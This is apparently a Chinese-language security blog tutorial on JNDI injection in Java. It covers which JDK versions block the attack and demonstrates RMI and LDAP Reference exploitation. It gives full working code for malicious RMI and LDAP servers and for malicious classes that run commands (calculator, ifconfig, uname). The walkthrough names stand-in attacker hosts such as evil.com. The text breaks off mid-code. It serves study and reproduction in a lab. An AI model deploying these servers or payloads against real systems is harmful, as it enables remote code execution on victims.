<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h1 id="前提防御-amp-JDK防御"><a href="#前提防御-amp-JDK防御" class="headerlink" title="前提防御&amp;JDK防御"></a>前提防御&amp;JDK防御</h1><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p>
<p>这里将所有不同版本JDK的防御都列出来：</p>
<ul>
<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p>
<h2 id="RMI攻击向量"><a href="#RMI攻击向量" class="headerlink" title="RMI攻击向量"></a>RMI攻击向量</h2><h3 id="RMI-Reference利用技巧"><a href="#RMI-Reference利用技巧" class="headerlink" title="RMI+Reference利用技巧"></a>RMI+Reference利用技巧</h3><p>JNDI提供了一个Reference类来表示某个对象的引用，<strong>这个类中包含被引用对象的类信息和地址</strong>。</p>
<p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。</p>
<p>那么这个JNDI利用技巧是啥呢？——<strong>就是将恶意的Reference类绑定在RMI注册表中，其中恶意Reference引用指向远程恶意的class文件。当用户在/JNDI客户端的lookup()函数参数外部可控/或/Reference类构造方法的classFactoryLocation参数外部可控/时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong>。</p>
<p>我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/6.png" alt="img"></p>
<ol>
<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li>
<li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li>
<li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li>
<li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li>
<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li>
<li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li>
</ol>
<p>代码如下，当然需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。</p>
<p>JNDIClient.java，lookup()函数参数外部可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilObject.java，恶意类，目的是弹计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process pc = Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java（恶意类开头千万不要有package的字段！！！）放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200630013330114.png" alt="image-20200630013330114"></p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200630013405125.png" alt="image-20200630013405125"></p>
<p>这里我再总结一下攻击的整体逻辑：</p>
<ol>
<li>JNDIClient：他就是个客户端，但是外部参数可控lookup（）位置；</li>
<li>EvilObject.class：恶意类，内部的构造函数弹出计算器；</li>
<li>RMIService：做了很多事<ol>
<li>注册1099端口，registry对象；</li>
<li>Reference类对象refObj：声明EvilObject恶意类，并写出他的位置，例如本地8080端口；</li>
<li>将上一步的refObj打包成ReferenceWrapper对象，叫做xxxWrapper；</li>
<li>最后一步直接绑定，将registry.bind(‘refObj’,xxxWrapper);</li>
</ol>
</li>
</ol>
<h3 id="漏洞点1-lookup-参数注入"><a href="#漏洞点1-lookup-参数注入" class="headerlink" title="漏洞点1-lookup()参数注入"></a>漏洞点1-lookup()参数注入</h3><p>当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。</p>
<p>下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。</p>
<p>AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">            ctx.lookup(uri);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">            ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AServer.java，是攻击者搭建的恶意RMI注册表服务而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），其将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1688</span>);</span><br><span class="line">      <span class="comment">//这里面test的位置是恶意类的位置，比如本地的话就是http://localhost:8080</span></span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, <span class="string">"test"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"exp"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后编写恶意EvilClassFactory类，目标是在客户端执行ifconfig命令，将其编译成class文件后与AServer放置于同一目录下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"ifconfig"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200630135450415.png" alt="image-20200630135450415"></p>
<p>最后小结一下，调用InitialContext.lookup()函数都有哪些类。</p>
<p>在RMI中调用了InitialContext.lookup()的类有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure>

<p>在LDAP中调用了InitialContext.lookup()的类有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring<span class="string">'s LdapTemplate.lookup()</span></span><br><span class="line"><span class="string">LdapTemplate.lookupContext()</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞点2-classFactoryLocation参数注入"><a href="#漏洞点2-classFactoryLocation参数注入" class="headerlink" title="漏洞点2-classFactoryLocation参数注入"></a>漏洞点2-classFactoryLocation参数注入</h3><p>前面lookup()参数注入是基于RMI客户端的（服务端有毒，去污染客户端），也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。</p>
<p>整个利用原理过程如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200703123339015.png" alt="image-20200703123339015"></p>
<p>BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">        ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            uri = <span class="string">"http://127.0.0.1/demo.class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]classFactoryLocation: "</span> + uri);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, uri);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'demo' to 'rmi://127.0.0.1:1099/demo'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"demo"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行uname -a命令并输出出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"uname -a"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200703132943046.png" alt="image-20200703132943046"></p>
<h3 id="漏洞点3-RMI恶意远程对象"><a href="#漏洞点3-RMI恶意远程对象" class="headerlink" title="漏洞点3-RMI恶意远程对象"></a>漏洞点3-RMI恶意远程对象</h3><p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p>
<ol>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ol>
<p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<p>Changelog:</p>
<ul>
<li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li>
<li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
<h2 id="LDAP攻击向量"><a href="#LDAP攻击向量" class="headerlink" title="LDAP攻击向量"></a>LDAP攻击向量</h2><p>通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。</p>
<h3 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h3><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p>
<p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p>
<p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的Jdk版本是1.8.0_73。</p>
<p>LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包：</p>
<p>maven-pom.xml：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8080/#EvilObject2"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span 